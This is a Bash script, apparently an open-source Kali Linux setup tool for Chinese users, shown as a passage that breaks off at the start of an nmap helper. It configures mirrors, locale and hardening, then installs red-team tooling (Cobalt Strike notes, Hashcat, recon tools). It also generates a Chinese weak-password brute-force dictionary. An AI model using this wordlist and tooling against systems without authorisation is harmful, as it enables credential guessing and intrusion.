#!/bin/bash
# ============================================================================
#
#   ██╗  ██╗ █████╗ ██╗     ██╗    ██╗    ██╗██████╗ ███████╗
#   ██║ ██╔╝██╔══██╗██║     ██║    ██║    ██║██╔══██╗██╔════╝
#   █████╔╝ ███████║██║     ██║    ██║ █╗ ██║██║  ██║███████╗
#   ██╔═██╗ ██╔══██║██║     ██║    ██║███╗██║██║  ██║╚════██║
#   ██║  ██╗██║  ██║███████╗██║    ╚███╔███╔╝██████╔╝███████║
#   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝     ╚══╝╚══╝ ╚═════╝ ╚══════╝
#
#   Kali Linux 全方位配置脚本 v3.0
#   Author : Mr.li8848
#   License: MIT — 仅供合法授权使用
#   Repo   : https://github.com/mr-li8848/kali-china-setup
#   Usage  : sudo bash kali-china-setup.sh
#
#   ─────────────────────────────────────────────────────────────
#   模块概览
#   ─────────────────────────────────────────────────────────────
#   一  ▶  系统基础初始化（所有用户必做）
#          换源测速 · 账号加固 · 基础工具 · SSH · 字典库
#   二  ▶  渗透测试 / 红队工具链
#          Burp Suite · Cobalt Strike · 信息收集 · 靶场 · 内网
#   三  ▶  安全运维 / 蓝队 / 等保
#          漏洞扫描器 · 基线核查 · 流量分析 · 应急响应
#   四  ▶  CTF 竞赛选手专属
#          密码学 · 二进制逆向 · Web 攻防 · 隐写取证
#   五  ▶  无线安全
#          网卡驱动 · aircrack-ng · AP 钓鱼
#   ─────────────────────────────────────────────────────────────
#
# ============================================================================

set -e

# ////////////////////////////////////////////////////////////////////////////
#  环境变量 & 终端配色
# ////////////////////////////////////////////////////////////////////////////

# ── 颜色 ──
declare -r RED='\033[0;31m'
declare -r GREEN='\033[0;32m'
declare -r YELLOW='\033[1;33m'
declare -r BLUE='\033[0;34m'
declare -r CYAN='\033[0;36m'
declare -r MAGENTA='\033[0;35m'
declare -r WHITE='\033[1;37m'
declare -r BOLD='\033[1m'
declare -r DIM='\033[2m'
declare -r NC='\033[0m'             # No Color

# ── 路径 ──
declare -r SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
declare -r LOG_FILE="/tmp/kali-setup-$(date +%Y%m%d-%H%M%S).log"
declare -r START_TIME="$(date '+%Y-%m-%d %H:%M:%S')"

# ── 运行时状态 ──
BEST_URL=""                          # 测速选出的最快源 URL
BEST_NAME=""                         # 最快源的人类可读名称
BRANCH="kali-rolling"                # Kali 发行分支
INSTALLED_COUNT=0                    # 本会话累计安装软件包数
SKIPPED_COUNT=0                      # 本会话累计跳过步骤数

# ////////////////////////////////////////////////////////////////////////////
#  通用工具函数
# ////////////////////////////////////////////////////////////////////////////

# 记录日志（同时输出到终端和日志文件）
log_msg()   { echo -e "$1" | tee -a "$LOG_FILE"; }

# 步骤状态指示器
step_ok()   { log_msg "   ${GREEN}✓${NC}  $1"; INSTALLED_COUNT=$((INSTALLED_COUNT + 1)); }
step_warn() { log_msg "   ${YELLOW}⚠${NC}  $1"; SKIPPED_COUNT=$((SKIPPED_COUNT + 1)); }
step_err()  { log_msg "   ${RED}✗${NC}  $1"; }
step_info() { log_msg "   ${CYAN}→${NC}  $1"; }
step_done() { log_msg "   ${GREEN}✔${NC}  $1 ${DIM}(已完成)${NC}"; }

# 横幅标题
banner() {
    echo ""
    echo -e "${BOLD}${CYAN}"
    echo "  ╔══════════════════════════════════════════════════════════╗"
    printf "  ║  %-54s ║\n" "$1"
    echo "  ╚══════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# 子模块标题
section_title() {
    echo ""
    echo -e "  ${BOLD}${MAGENTA}▶ ${1}${NC}"
    echo -e "  ${MAGENTA}──────────────────────────────────────────────────────────${NC}"
}

# 信息卡片
info_card() {
    local emoji="$1"
    local title="$2"
    shift 2
    echo -e "  ${BOLD}${emoji}  ${title}${NC}"
    for line in "$@"; do
        echo -e "     ${CYAN}•${NC} ${line}"
    done
    echo ""
}

# 确认提示（默认 Y）
confirm_default_yes() {
    local prompt="$1"
    local answer
    read -p "$(echo -e "   ${YELLOW}${prompt} [Y/n]: ${NC}")" answer
    [[ ! "$answer" =~ ^[Nn] ]]
}

# 确认提示（默认 N）
confirm_default_no() {
    local prompt="$1"
    local answer
    read -p "$(echo -e "   ${YELLOW}${prompt} [y/N]: ${NC}")" answer
    [[ "$answer" =~ ^[Yy] ]]
}

# 自动返回上一级菜单（延迟 1.5 秒，按任意键立即返回）
press_enter() {
    echo ""
    echo -ne "   ${DIM}${SECONDS}s ── 1.5秒后自动返回，按任意键立即返回...${NC}"
    read -t 1.5 -n 1 -s _ 2>/dev/null || true
    echo -e "\r   ${DIM}← 返回上一级菜单                          ${NC}"
    sleep 0.3
}

# ////////////////////////////////////////////////////////////////////////////
#  前置检查
# ////////////////////////////////////////////////////////////////////////////

check_root() {
    if [ "$(id -u)" -ne 0 ]; then
        echo ""
        echo -e "  ${RED}${BOLD}⛔ 权限不足 —— 请使用 sudo 运行${NC}"
        echo ""
        echo -e "     ${WHITE}sudo bash $0${NC}"
        echo ""
        exit 1
    fi
}

# 检测 Kali 版本
detect_kali_version() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        log_msg "  检测到系统: ${GREEN}${NAME} ${VERSION}${NC}"
    else
        log_msg "  ${DIM}无法读取 /etc/os-release，假定为 kali-rolling${NC}"
    fi
}

# ////////////////////////////////////////////////////////////////////////////
#  模块：六、新手避坑指南
# ////////////////////////////////////////////////////////////////////////////

show_warnings() {
    banner "⚠  新手拿到 Kali 最容易踩的 5 个坑"

    local warnings=(
        "❌ 不换源直接 apt update → 下载速度 ≤ 10KB/s，动辄超时"
        "    ✅ 对策：进入「系统基础初始化」自动测速并切换到最快的国内镜像"

        "❌ 不改默认账号 kali / kali → SSH 暴露后秒被入侵"
        "    ✅ 对策：立即修改密码，新建独立管理员账号，禁用 root 远程登录"

        "❌ 拿到 Kali 就扫公网 IP、随意测试网站 → 违反《网络安全法》"
        "    ✅ 对策：只测试自己拥有书面授权的目标，必要时搭建本地靶场练习"

        "❌ 网上下载来路不明的远控木马直接运行 → 本机反被控"
        "    ✅ 对策：所有可疑程序在隔离虚拟机 / 沙箱中运行，断开外部网络"

        "❌ 以为 Kali 预装了全部工具 → 新版 meta-packages 已大幅精简"
        "    ✅ 对策：按身份（红队/蓝队/CTF/无线）使用本脚本按需补全"
    )

    for ((i = 0; i < ${#warnings[@]}; i++)); do
        local n=$((i / 2 + 1))
        if ((i % 2 == 0)); then
            echo ""
        fi
        echo -e "  ${RED}${BOLD}${warnings[$i]}${NC}"
    done

    echo ""
    press_enter
    clear
}

# ////////////////////////////////////////////////////////////////////////////
#  模块：一、系统基础初始化
# ////////////////////////////////////////////////////////////////////////////

section_one() {
    banner "一、系统基础初始化（所有用户必做）"

    # ------------------------------------------------------------------
    #  1.1  国内镜像源测速 & 替换
    # ------------------------------------------------------------------
    section_title "1.1  国内镜像源测速与自动选择"

    detect_kali_version

    # 候选镜像列表：名称 → URL
    declare -A MIRRORS
    MIRRORS=(
        ["清华大学 (TUNA)"]="https://mirrors.tuna.tsinghua.edu.cn/kali/"
        ["中科大 (USTC)"]="https://mirrors.ustc.edu.cn/kali/"
        ["阿里云 (Aliyun)"]="https://mirrors.aliyun.com/kali/"
        ["华为云 (HuaweiCloud)"]="https://mirrors.huaweicloud.com/kali/"
        ["腾讯云 (TencentCloud)"]="https://mirrors.cloud.tencent.com/kali/"
        ["南京大学 (NJU)"]="https://mirror.nju.edu.cn/kali/"
        ["上海交大 (SJTU)"]="https://mirrors.sjtug.sjtu.edu.cn/kali/"
        ["浙江大学 (ZJU)"]="https://mirrors.zju.edu.cn/kali/"
        ["兰州大学 (LZU)"]="https://mirror.lzu.edu.cn/kali/"
        ["中科院 (ISCAS)"]="https://mirror.iscas.ac.cn/kali/"
    )

    local TEST_FILE="dists/kali-rolling/Release"
    local TIMEOUT_SEC=8
    declare -A SPEEDS PINGS
    declare -a AVAILABLE

    echo ""
    printf "   %-32s %18s %15s\n" "镜像名称" "下载速度" "网络延迟"
    printf "   %-32s %18s %15s\n" "──────────────────────────────" "────────────────" "─────────────"

    for NAME in "${!MIRRORS[@]}"; do
        local URL="${MIRRORS[$NAME]}"
        local DOMAIN
        DOMAIN=$(echo "$URL" | awk -F/ '{print $3}')

        # ── Ping 延迟测试 ──
        local PING_MS=9999
        local PING_RESULT="✗ 不可达"
        if ping -c 2 -W 2 "$DOMAIN" &>/dev/null; then
            PING_MS=$(ping -c 2 -W 2 "$DOMAIN" 2>/dev/null | tail -1 | awk -F/ '{print $5}' | cut -d. -f1)
            if [ -n "$PING_MS" ]; then
                PING_RESULT="${PING_MS} ms"
                PINGS["$NAME"]=$PING_MS
            else
                PINGS["$NAME"]=9999
            fi
        else
            PINGS["$NAME"]=9999
        fi

        # ── 下载速度测试 ──
        local SPEED_RESULT="✗ 超时"
        if command -v curl &>/dev/null; then
            local CURL_OUTPUT HTTP_CODE DL_SPEED SPEED_KB
            CURL_OUTPUT=$(curl -s -w "%{speed_download}\n%{http_code}" \
                -o /dev/null \
                --connect-timeout 5 \
                --max-time $TIMEOUT_SEC \
                "${URL}${TEST_FILE}" 2>/dev/null || echo "0\n000")

            HTTP_CODE=$(echo "$CURL_OUTPUT" | tail -1)
            DL_SPEED=$(echo "$CURL_OUTPUT" | head -1)

            if [ "$HTTP_CODE" = "200" ] && [ -n "$DL_SPEED" ]; then
                SPEED_KB=$(echo "$DL_SPEED" | awk '{printf "%.0f", $1/1024}')
                if [ "$SPEED_KB" -ge 1024 ]; then
                    local SPEED_MB
                    SPEED_MB=$(echo "$SPEED_KB" | awk '{printf "%.1f MB/s", $1/1024}')
                    SPEED_RESULT="${SPEED_MB}"
                else
                    SPEED_RESULT="${SPEED_KB} KB/s"
                fi
                SPEEDS["$NAME"]=$SPEED_KB
                AVAILABLE+=("$NAME")
            else
                SPEEDS["$NAME"]=0
            fi
        fi

        printf "   ${CYAN}%-32s${NC} %18s %15s\n" "$NAME" "$SPEED_RESULT" "$PING_RESULT"
    done

    echo ""

    # ── 选最快的源 ──
    if [ ${#AVAILABLE[@]} -eq 0 ]; then
        log_msg "   ${RED}所有镜像均不可达 —— 将回退到清华 TUNA${NC}"
        BEST_NAME="清华大学 (TUNA)"
        BEST_URL="https://mirrors.tuna.tsinghua.edu.cn/kali/"
    else
        local BEST_SPEED=0
        for NAME in "${AVAILABLE[@]}"; do
            if [ "${SPEEDS[$NAME]}" -gt "$BEST_SPEED" ]; then
                BEST_SPEED="${SPEEDS[$NAME]}"
                BEST_NAME="$NAME"
            fi
        done
        [ -z "$BEST_NAME" ] && BEST_NAME="${AVAILABLE[0]}"
        BEST_URL="${MIRRORS[$BEST_NAME]}"

        # 推荐结果
        echo -e "   ${BOLD}${GREEN}★ 推荐镜像:${NC} ${WHITE}${BEST_NAME}${NC}"
        echo -e "     ${DIM}${BEST_URL}${NC}"

        # 前三名排名
        echo ""
        echo -e "   ${BOLD}测速排名 Top 3:${NC}"
        local RANKED=()
        for NAME in "${AVAILABLE[@]}"; do
            RANKED+=("${SPEEDS[$NAME]}|$NAME")
        done
        IFS=$'\n' RANKED=($(sort -t'|' -k1 -rn <<<"${RANKED[*]}")); unset IFS

        local EMOJIS=(" 🥇" " 🥈" " 🥉")
        for i in 0 1 2; do
            [ -z "${RANKED[$i]}" ] && continue
            local S_NAME S_SPEED
            S_NAME=$(echo "${RANKED[$i]}" | cut -d'|' -f2)
            S_SPEED=$(echo "${RANKED[$i]}" | cut -d'|' -f1)
            printf "     %s  ${CYAN}%-30s${NC} ${GREEN}%s KB/s${NC}\n" \
                "${EMOJIS[$i]}" "$S_NAME" "$S_SPEED"
        done
    fi

    # ── 用户确认 / 手动选择 ──
    echo ""
    if ! confirm_default_yes "使用推荐镜像？"; then
        echo ""
        echo -e "   ${BOLD}请手动选择镜像源:${NC}"
        local COUNT=1
        for NAME in "${AVAILABLE[@]}"; do
            printf "     ${BOLD}%2d${NC})  %s\n" $COUNT "$NAME"
            COUNT=$((COUNT + 1))
        done
        echo ""
        local CHOICE
        read -p "   $(echo -e "请输入序号 [1-${#AVAILABLE[@]}]: ")" CHOICE
        if [[ "$CHOICE" =~ ^[0-9]+$ ]] && [ "$CHOICE" -ge 1 ] && [ "$CHOICE" -le ${#AVAILABLE[@]} ]; then
            BEST_NAME="${AVAILABLE[$((CHOICE - 1))]}"
            BEST_URL="${MIRRORS[$BEST_NAME]}"
        fi
    fi

    # ── 写入 sources.list ──
    if [ ! -f /etc/apt/sources.list.bak ]; then
        cp /etc/apt/sources.list /etc/apt/sources.list.bak 2>/dev/null || true
    fi

    cat > /etc/apt/sources.list << EOF
# ═══════════════════════════════════════════════════════════════
#  Kali Linux APT Source — 由 kali-china-setup.sh 自动生成
#  作者   : Mr.li8848
#  镜像   : ${BEST_NAME}
#  时间   : $(date '+%Y-%m-%d %H:%M:%S')
#  原备份 : /etc/apt/sources.list.bak
# ═══════════════════════════════════════════════════════════════

deb     ${BEST_URL} ${BRANCH} main contrib non-free non-free-firmware
deb-src ${BEST_URL} ${BRANCH} main contrib non-free non-free-firmware
EOF

    step_ok "sources.list 已更新 → ${BEST_NAME}"

    # ── apt update & upgrade ──
    echo ""
    step_info "正在 apt update ..."
    apt update -y || true

    if confirm_default_yes "执行全量系统升级 (apt dist-upgrade) ？"; then
        step_info "正在升级全部软件包（可能较久，请耐心等待）..."
        apt dist-upgrade -y
        apt autoremove -y
        apt autoclean -y
        step_ok "系统已升级到最新状态"
    else
        step_warn "已跳过系统升级（建议稍后手动执行）"
    fi

    # ------------------------------------------------------------------
    #  1.2  账号安全加固
    # ------------------------------------------------------------------
    section_title "1.2  账号安全加固"

    echo -e "   ${RED}${BOLD}⚠  Kali 默认账号 kali / kali 极为危险，务必立即处理！${NC}"
    echo ""

    # 修改 kali 用户密码
    if id "kali" &>/dev/null; then
        if confirm_default_yes "修改 kali 用户密码？"; then
            echo -e "   ${YELLOW}请为 kali 用户设置强密码（至少 12 位，含大小写字母 + 数字 + 符号）:${NC}"
            passwd kali
            step_ok "kali 用户密码已更新"
        fi
    else
        step_info "kali 用户不存在，跳过"
    fi

    # 新建管理员用户
    if confirm_default_yes "创建新的管理员用户？"; then
        local NEW_USER
        read -p "   $(echo -e "${CYAN}新用户名: ${NC}")" NEW_USER
        if [ -n "$NEW_USER" ]; then
            if id "$NEW_USER" &>/dev/null; then
                step_warn "用户 ${NEW_USER} 已存在，仅重置密码"
                passwd "$NEW_USER"
            else
                useradd -m -G sudo -s /bin/bash "$NEW_USER"
                echo -e "   ${YELLOW}请设置 ${NEW_USER} 的密码:${NC}"
                passwd "$NEW_USER"
                step_ok "管理员用户 ${NEW_USER} 已创建并加入 sudo 组"
            fi
        fi
    fi

    # SSH 安全建议
    echo ""
    step_info "安全建议：编辑 /etc/ssh/sshd_config，设置 PermitRootLogin no 以禁用 root 远程登录"

    # ------------------------------------------------------------------
    #  1.3  常用基础工具
    # ------------------------------------------------------------------
    section_title "1.3  安装常用基础工具"

    local BASE_PKGS=(
        # 开发 & 构建
        curl wget git vim net-tools
        build-essential dkms linux-headers-"$(uname -r)"
        apt-transport-https ca-certificates gnupg lsb-release
        software-properties-common
        # 日常使用
        htop tmux screen unzip p7zip-full
        jq bat fd-find ripgrep fzf zsh
        # 虚拟机增强
        open-vm-tools-desktop
    )

    echo ""
    echo -e "   ${DIM}以下工具将被安装:${NC}"
    echo -e "   ${CYAN}$(printf '%s  ' "${BASE_PKGS[@]}")${NC}"
    echo ""

    if confirm_default_yes "继续安装？"; then
        apt install -y "${BASE_PKGS[@]}" 2>/dev/null || true
        step_ok "基础工具安装完成"
    else
        step_warn "已跳过基础工具安装"
    fi

    # ------------------------------------------------------------------
    #  1.4  基础环境配置
    # ------------------------------------------------------------------
    section_title "1.4  基础环境配置"

    # ── SSH 服务 ──
    if confirm_default_yes "开启 SSH 服务并设为开机自启？"; then
        apt install -y openssh-server 2>/dev/null || true
        systemctl enable ssh --now 2>/dev/null || systemctl enable sshd --now 2>/dev/null || true
        step_ok "SSH 服务已开启"
    fi

    # ── 浏览器插件推荐 ──
    echo ""
    info_card "🌐" "推荐浏览器插件（请手动安装）" \
        "Wappalyzer          — 一键识别目标网站技术栈" \
        "Cookie Editor       — 快速查看/修改/导出 Cookie" \
        "Proxy SwitchyOmega  — 代理规则自动切换，Burp Suite 联动必备" \
        "安装方式: Chrome 应用商店 / Firefox Add-ons 搜索插件名即可"

    # ── Proxychains 代理链 ──
    if confirm_default_yes "安装并配置 Proxychains4？"; then
        apt install -y proxychains4 2>/dev/null || apt install -y proxychains 2>/dev/null || true
        if [ -f /etc/proxychains4.conf ]; then
            cp /etc/proxychains4.conf /etc/proxychains4.conf.bak 2>/dev/null || true
            # 启用动态链模式
            sed -i 's/^strict_chain/#strict_chain/' /etc/proxychains4.conf
            sed -i 's/^#dynamic_chain/dynamic_chain/' /etc/proxychains4.conf
            # 确保默认代理条目存在
            grep -q "^socks5 127.0.0.1 1080" /etc/proxychains4.conf 2>/dev/null || \
                echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
            step_ok "Proxychains4 已配置 (默认 socks5://127.0.0.1:1080)"
            step_info "使用时请修改 /etc/proxychains4.conf 中的代理地址为你实际使用的代理"
        fi
    fi

    # ── 字典库 ──
    section_title "1.4.4  导入字典库"
    if confirm_default_yes "安装 SecLists + rockyou (约 1GB)？"; then
        # SecLists
        if [ ! -d /usr/share/seclists ]; then
            step_info "正在克隆 SecLists (depth=1)..."
            if git clone --depth 1 https://gitee.com/mr-li8848/SecLists.git /usr/share/seclists 2>/dev/null; then
                step_ok "SecLists → /usr/share/seclists (Gitee 镜像)"
            elif git clone --depth 1 https://github.com/danielmiessler/SecLists.git /usr/share/seclists 2>/dev/null; then
                step_ok "SecLists → /usr/share/seclists (GitHub)"
            else
                step_warn "SecLists 下载失败，请检查网络后手动安装"
            fi
        else
            step_done "SecLists 已存在"
        fi

        # rockyou
        if [ -f /usr/share/wordlists/rockyou.txt ]; then
            step_done "rockyou.txt 已就绪"
        elif [ -f /usr/share/wordlists/rockyou.txt.gz ]; then
            gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true
            step_ok "rockyou.txt 已解压"
        else
            mkdir -p /usr/share/wordlists
            step_warn "rockyou.txt 未找到，请手动下载"
        fi
    fi

    # ── 中文弱口令字典 ──
    if confirm_default_yes "生成中文弱口令字典？"; then
        mkdir -p /usr/share/wordlists
        local CNPWD_FILE="/usr/share/wordlists/chinese-weak-passwords.txt"

        # 基础常见弱口令
        cat > "$CNPWD_FILE" << 'CNPWD'
# ═══════════════════════════════════════════════════════════════
#  中文环境常见弱口令字典
#  生成工具: kali-china-setup.sh (Mr.li8848)
#  说明    : 组合了通用弱密码 + 中文语境高频口令
# ═══════════════════════════════════════════════════════════════
123456
12345678
123456789
1234567890
password
admin
admin123
admin888
admin@123
Admin@123
root123
toor
abc123
qwerty
qwerty123
iloveyou
monkey
123123
P@ssw0rd
Passw0rd
Aa123456
1qaz2wsx
!QAZ2wsx
1qaz@WSX
China123
zhongguo
zhongguo123
test
guest
user
CNPWD

        # 组合生成：常见用户名前缀 + 数字后缀
        for prefix in admin root test user guest manager; do
            for suffix in 123 1234 12345 123456 888 666 520 1314 2024 2025 2026 111111; do
                echo "${prefix}${suffix}"
            done
        done >> "$CNPWD_FILE"

        # 中文拼音组合
        for word in zhongguo beijing shanghai shenzhen guangzhou hangzhou chengdu; do
            for suffix in 123 123456 888 666 520 1314 @123 2024; do
                echo "${word}${suffix}"
            done
        done >> "$CNPWD_FILE"

        # 国内常见日期格式
        for y in 2020 2021 2022 2023 2024 2025 2026; do
            echo "${y}"
            echo "${y}${y:2:2}"  # 如 202520
        done >> "$CNPWD_FILE"

        step_ok "中文弱口令字典 → ${CNPWD_FILE}"
    fi

    # ------------------------------------------------------------------
    #  1.5  中文可视化 — 语言包 + 字体 + Xfce 主题
    # ------------------------------------------------------------------
    section_title "1.5  中文可视化 — 语言 · 字体 · 桌面主题"

    if confirm_default_yes "安装中文语言包并切换系统语言为简体中文？"; then
        # locales
        if [ -f /etc/locale.gen ]; then
            sed -i 's/^#\s*zh_CN.UTF-8/zh_CN.UTF-8 UTF-8/' /etc/locale.gen
            grep -q "^zh_CN.UTF-8" /etc/locale.gen || echo "zh_CN.UTF-8 UTF-8" >> /etc/locale.gen
            locale-gen 2>/dev/null || true
        fi

        # 系统默认语言
        cat > /etc/default/locale << 'LOCALEOF'
LANG=zh_CN.UTF-8
LC_ALL=zh_CN.UTF-8
LANGUAGE=zh_CN:zh
LOCALEOF
        update-locale LANG=zh_CN.UTF-8 2>/dev/null || true

        # 环境变量全局生效
        cat > /etc/profile.d/kali-zh-locale.sh << 'ENVEOF'
export LANG=zh_CN.UTF-8
export LC_ALL=zh_CN.UTF-8
export LANGUAGE=zh_CN:zh
ENVEOF
        chmod +x /etc/profile.d/kali-zh-locale.sh
        grep -q "LANG=zh_CN.UTF-8" /etc/environment 2>/dev/null || echo "LANG=zh_CN.UTF-8" >> /etc/environment

        step_ok "系统语言已切换为简体中文"
    fi

    # 中文字体
    if confirm_default_yes "安装中文字体 (防止中文乱码)？"; then
        apt install -y fonts-wqy-zenhei fonts-wqy-microhei fonts-noto-cjk xfonts-intl-chinese 2>/dev/null || \
        apt install -y fonts-wqy-zenhei fonts-wqy-microhei 2>/dev/null || true
        step_ok "中文字体安装完成"
    fi

    # 中文输入法 (fcitx5)
    if confirm_default_yes "安装中文输入法 fcitx5-pinyin？"; then
        apt install -y fcitx5 fcitx5-chinese-addons \
            fcitx5-frontend-gtk3 fcitx5-frontend-gtk2 \
            fcitx5-frontend-qt5 fcitx5-frontend-qt6 2>/dev/null || \
        apt install -y fcitx fcitx-googlepinyin 2>/dev/null || true

        cat > /etc/profile.d/kali-fcitx.sh << 'FCITXEOF'
export GTK_IM_MODULE=fcitx
export QT_IM_MODULE=fcitx
export XMODIFIERS=@im=fcitx
FCITXEOF
        chmod +x /etc/profile.d/kali-fcitx.sh
        step_ok "fcitx5 拼音输入法已安装"
        step_info "重启后终端执行 fcitx5-configtool 添加拼音"
    fi

    # ── Xfce 桌面主题 + 图标包 ──
    if confirm_default_yes "安装 Xfce 美化主题和图标包？"; then
        # 主题引擎
        apt install -y gtk2-engines-murrine gtk2-engines-pixbuf 2>/dev/null || true

        # 图标主题: Papirus（现代扁平风）
        apt install -y papirus-icon-theme 2>/dev/null || true

        # 窗口主题: Greybird + Arc
        apt install -y greybird-gtk-theme arc-theme 2>/dev/null || \
        apt install -y greybird-gtk-theme 2>/dev/null || true

        # 光标主题
        apt install -y breeze-cursor-theme 2>/dev/null || true

        # 终端字体
        apt install -y fonts-firacode 2>/dev/null || true

        # 如果 xfconf-query 可用，自动应用主题
        if command -v xfconf-query &>/dev/null; then
            # 需要以实际用户身份运行，切换回 $SUDO_USER
            if [ -n "$SUDO_USER" ] && [ "$SUDO_USER" != "root" ]; then
                local UID
                UID=$(id -u "$SUDO_USER" 2>/dev/null)
                local DBUS="unix:path=/run/user/${UID}/bus"

                sudo -u "$SUDO_USER" env DBUS_SESSION_BUS_ADDRESS="$DBUS" DISPLAY=:0 \
                    xfconf-query -c xfwm4 -p /general/theme -s Greybird 2>/dev/null || true
                sudo -u "$SUDO_USER" env DBUS_SESSION_BUS_ADDRESS="$DBUS" DISPLAY=:0 \
                    xfconf-query -c xsettings -p /Net/ThemeName -s Greybird 2>/dev/null || true
                sudo -u "$SUDO_USER" env DBUS_SESSION_BUS_ADDRESS="$DBUS" DISPLAY=:0 \
                    xfconf-query -c xsettings -p /Net/IconThemeName -s Papirus 2>/dev/null || true
                sudo -u "$SUDO_USER" env DBUS_SESSION_BUS_ADDRESS="$DBUS" DISPLAY=:0 \
                    xfconf-query -c xfwm4 -p /general/title_font -s "Noto Sans CJK SC 10" 2>/dev/null || true
                sudo -u "$SUDO_USER" env DBUS_SESSION_BUS_ADDRESS="$DBUS" DISPLAY=:0 \
                    xfconf-query -c xsettings -p /Gtk/CursorThemeName -s Breeze 2>/dev/null || true
                step_ok "Xfce 主题已自动应用: Greybird + Papirus + Breeze"
            else
                step_ok "主题已安装，请手动在 设置→外观 中选择"
            fi
        else
            step_ok "主题已安装: Greybird + Papirus + Breeze"
            step_info "Kali 菜单 → 设置 → 外观 → 选择主题和图标"
        fi
    fi

    # ── 小结 ──
    echo ""
    echo -e "   ${GREEN}${BOLD}═══════════════════════════════════════════${NC}"
    echo -e "   ${GREEN}${BOLD}  系统基础初始化 完成 ✓${NC}"
    echo -e "   ${GREEN}${BOLD}═══════════════════════════════════════════${NC}"
    echo -e "   ${DIM}已安装: ${INSTALLED_COUNT} 项    已跳过: ${SKIPPED_COUNT} 项${NC}"
    echo ""
    press_enter
}

# ////////////////////////////////////////////////////////////////////////////
#  模块：二、渗透测试 / 红队工具链
# ////////////////////////////////////////////////////////////////////////////

section_two() {
    while true; do
        banner "二、渗透测试 / 红队工具链"

        echo -e "   ${BOLD}请选择子模块:${NC}"
        echo ""
        echo -e "   ${CYAN}1${NC})  工具链调试        Burp Suite · Cobalt Strike · Hashcat"
        echo -e "   ${CYAN}2${NC})  信息收集环境      子域名测绘 · 端口扫描 · 目录爆破"
        echo -e "   ${CYAN}3${NC})  漏洞利用环境      Docker 靶场 · Vulhub · POC 框架"
        echo -e "   ${CYAN}4${NC})  内网渗透工具      BloodHound · Impacket · Mimikatz"
        echo -e "   ${CYAN}5${NC})  后渗透 / 持久化    Payload 生成 · 流量混淆 · 权限维持"
        echo ""
        echo -e "   ${DIM}0${NC})  ${DIM}← 返回主菜单${NC}"
        echo ""

        local SUB
        read -p "   $(echo -e "请选择 [0-5]: ")" SUB

        case "$SUB" in
            1) red_team_tools ;;
            2) red_team_recon ;;
            3) red_team_exploit ;;
            4) red_team_internal ;;
            5) red_team_persist ;;
            0) return ;;
            *) echo -e "   ${RED}无效选项，请重新输入${NC}"; sleep 0.5 ;;
        esac
    done
}

# ── 2.1  工具链调试 ──
red_team_tools() {
    section_title "2.1  工具链调试"

    # Burp Suite
    info_card "🔷" "Burp Suite" \
        "社区版(Community)已内置在 Kali 菜单中，无需额外安装" \
        "专业版(Professional)需购买授权后下载 jar 包手动运行" \
        "推荐插件: Active Scan++ / JWT Editor / SQLiPy / Turbo Intruder" \
        "代理默认监听 127.0.0.1:8080，访问 http://burpsuite 下载 CA 证书" \
        "证书导入浏览器后即可拦截 HTTPS 流量"

    # Cobalt Strike
    info_card "🔶" "Cobalt Strike" \
        "商业 C2 框架，需正版授权 — 仅用于授权的红队演练" \
        "团队服务器: ./teamserver <your_ip> <password>" \
        "客户端连接: 目标 IP 端口 50050" \
        "建议将 CS 目录放置于 /opt/cobaltstrike"

    # Hashcat
    info_card "🔑" "Hashcat — GPU 密码爆破" \
        "Hashcat 是世界上最快的密码破解工具，支持 300+ 哈希算法"

    if confirm_default_yes "安装 Hashcat 及 GPU 驱动支持？"; then
        apt install -y hashcat hashid hash-identifier 2>/dev/null || true
        step_ok "Hashcat / hashid 已安装"

        # NVIDIA
        if lspci 2>/dev/null | grep -qi nvidia; then
            step_info "检测到 NVIDIA 显卡，安装 CUDA / OpenCL 支持..."
            apt install -y nvidia-opencl-icd nvidia-cuda-toolkit 2>/dev/null && \
                step_ok "NVIDIA CUDA 驱动已安装" || \
                step_warn "NVIDIA 驱动安装失败，请手动配置"
        fi

        # AMD
        if lspci 2>/dev/null | grep -qi amd; then
            step_info "检测到 AMD 显卡，安装 ROCm OpenCL 运行时..."
            apt install -y rocm-opencl-runtime 2>/dev/null && \
                step_ok "AMD ROCm 已安装" || \
                step_warn "AMD ROCm 安装失败"
        fi

        echo -e "   ${DIM}用法: hashcat -m <mode> -a <attack> <hash_file> <wordlist>${NC}"
    fi

    echo ""

    # 无线抓包网卡驱动
    if confirm_default_yes "安装抓包网卡驱动 (rtl8812au / rtl8188eus)？"; then
        apt install -y realtek-rtl88xxau-dkms realtek-rtl8188eus-dkms 2>/dev/null || true

        if ! dkms status 2>/dev/null | grep -qi rtl88; then
            step_info "用 DKMS 安装失败，尝试从源码编译 rtl8812au..."
            local RTL_DIR="/tmp/rtl8812au-$$"
            if git clone --depth 1 https://github.com/aircrack-ng/rtl8812au.git "$RTL_DIR" 2>/dev/null; then
                (cd "$RTL_DIR" && make && make install) 2>/dev/null && \
                    step_ok "rtl8812au 驱动编译安装成功" || \
                    step_warn "rtl8812au 编译失败"
                rm -rf "$RTL_DIR"
            fi
        else
            step_ok "无线网卡驱动已就绪"
        fi
    fi

    press_enter
}

# ── 2.2  信息收集环境 ──
red_team_recon() {
    section_title "2.2  信息收集环境"

    # 子域名测绘
    info_card "🔍" "子域名资产测绘" \
        "Subfinder  — 高速被动子域名枚举 (ProjectDiscovery 出品)" \
        "Amass     — OWASP 旗下综合性资产发现工具" \
        "OneForAll — 国内最强子域名收集工具，聚合数十个数据源"

    apt install -y subfinder amass 2>/dev/null || true

    if [ ! -d /opt/OneForAll ]; then
        if git clone --depth 1 https://github.com/shmilylty/OneForAll.git /opt/OneForAll 2>/dev/null; then
            step_ok "OneForAll → /opt/OneForAll"
            step_info "使用: cd /opt/OneForAll && python3 oneforall.py --target example.com run"
        else
            step_warn "OneForAll 克隆失败"
        fi
    else
        step_done "OneForAll 已存在"
    fi
    step_ok "子域名工具已就绪"

    echo ""

    # 端口扫描
    info_card "🖥️" "端口扫描 — Nmap 优化模板" \
        "nmap    — 网络扫描之王" \
        "masscan — 互联网级高速端口扫描" \
        "naabu   — Go 编写的高速 SYN 扫描器"

    apt install -y nmap masscan naabu 2>/dev/null || true

    mkdir -p /opt/nmap-scripts

    # 快速全端口扫描
    cat > /opt/nmap-scripts/quick-scan.sh << 'NMQUICK'
#!/bin/bash
